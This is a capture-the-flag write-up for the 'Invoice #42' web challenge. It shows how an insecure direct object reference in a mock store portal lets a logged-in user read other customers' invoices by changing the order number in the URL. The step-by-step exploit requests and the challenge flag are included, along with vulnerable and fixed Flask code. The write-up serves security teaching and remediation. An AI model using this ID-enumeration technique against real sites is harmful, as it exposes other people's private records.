# Invoice #42 — Web Security Writeup

## Challenge Metadata

| Field | Details |
| :--- | :--- |
| **Event** | V3CT0R CTF 2026 |
| **Category** | Web Security |
| **Challenge Author** | Sri Sakthi Dinesh S |
| **Target URL** | `https://web3.cybernexus.live/` |
| **Vulnerability Class** | Insecure Direct Object Reference (IDOR) / Broken Object-Level Authorization (BOLA) |
| **CWE Classification** | CWE-639: Authorization Bypass Through User-Controlled Key |
| **Flag** | `V3ct0r{1D0R_0rd3r_1003}` |

---

## 1. Executive Summary

During V3CT0R CTF 2026, the **Invoice #42** challenge presented the Meridian Market customer portal, an e-commerce order management system. Authenticated access was established using default customer credentials (`John` / `123456`).

While the user interface dashboard restricted the displayed order list to records owned by the active session (`Order #1001`), the backend route responsible for rendering individual order details failed to validate whether the authenticated user possessed ownership rights to the requested record. By manipulating the direct object identifier in the request path (`/order/1003`), an attacker could view arbitrary customer invoices, exposing confidential customer records and the flag.

---

## 2. Technical Vulnerability Analysis

### Primary Vulnerability: Broken Object Level Authorization (CWE-639 / OWASP API1:2023)

* **Root Cause:** The application implements perimeter authentication (verifying that the client holds an active, valid session cookie), but completely omits object-level authorization checks at the data-access layer.
* **Payload Mechanics:** The order retrieval route relies directly on an untrusted, sequential integer supplied by the client:
  $$\text{Request URL} = \text{/order/} \parallel \text{Order\_ID}$$
* **Flaw Impact:** Hiding records in the UI (`/dashboard`) does not secure addressable endpoints. An authenticated attacker can iterate through sequential primary keys to extract arbitrary records.

---

## 3. Step-by-Step Exploitation Walkthrough

### Step 1: Baseline Authentication

Navigating to `https://web3.cybernexus.live/` presented the customer login form pre-filled with the identifier `John`. Authenticating with test credentials (`John` / `123456`) succeeded:

```http
POST /login HTTP/1.1
Host: web3.cybernexus.live
Content-Type: application/x-www-form-urlencoded

username=John&password=123456
```

The server set an active session cookie and redirected to the customer dashboard.

### Step 2: Dashboard Inspection & Endpoint Analysis

Upon loading `/dashboard`, the interface displayed John's legitimate customer history, referencing exactly one purchase:

* **Order ID:** `#1001`
* **Target Endpoint:** `/order/1001`

```http
GET /order/1001 HTTP/1.1
Host: web3.cybernexus.live
Cookie: session=<SESSION_TOKEN>
```

The server rendered order `#1001` containing John's items and billing summary.

### Step 3: Parameter Manipulation & IDOR Exploitation

Because the object identifier was a sequential integer, nearby records were tested to evaluate object-level authorization enforcement. Sending a request for order `#1003` under John's session cookie bypassed access controls:

```bash
curl -s 'https://web3.cybernexus.live/order/1003' \
  -H 'Cookie: session=<SESSION_TOKEN>'
```

The server returned HTTP 200 with the full invoice details belonging to an alternate customer account.

### Step 4: Flag Extraction

Inspecting the HTML response of `/order/1003` revealed the challenge completion container:

```html
<div class="flag-box">
    V3ct0r{1D0R_0rd3r_1003}
</div>
```

**Retrieved Flag:** `V3ct0r{1D0R_0rd3r_1003}`

---

## 4. Remediation & Defensive Guidelines

### 1. Enforce Object-Level Authorization Checks
Ensure that every database query retrieving user-specific resources validates that the resource belongs to the currently authenticated identity.

#### Vulnerable Implementation:
```python
@app.route('/order/<int:order_id>')
@login_required
def get_order(order_id):
    # VULNERABLE: Retrieves order solely by client-supplied ID
    order = Order.query.get_or_404(order_id)
    return render_template('order.html', order=order)
```

#### Secure Implementation:
```python
@app.route('/order/<int:order_id>')
@login_required
def get_order(order_id):
    # SECURE: Binds the query to the authenticated session principal
    order = Order.query.filter_by(id=order_id, customer_id=current_user.id).first()
    if not order:
        abort(404)
    return render_template('order.html', order=order)
```

### 2. Replace Sequential Identifiers with Cryptographic UUIDs
Use cryptographically random UUIDs (version 4) for externally exposed record identifiers rather than auto-incrementing database primary keys. While UUIDs do not replace authorization controls, they prevent sequential enumeration attacks across datasets.
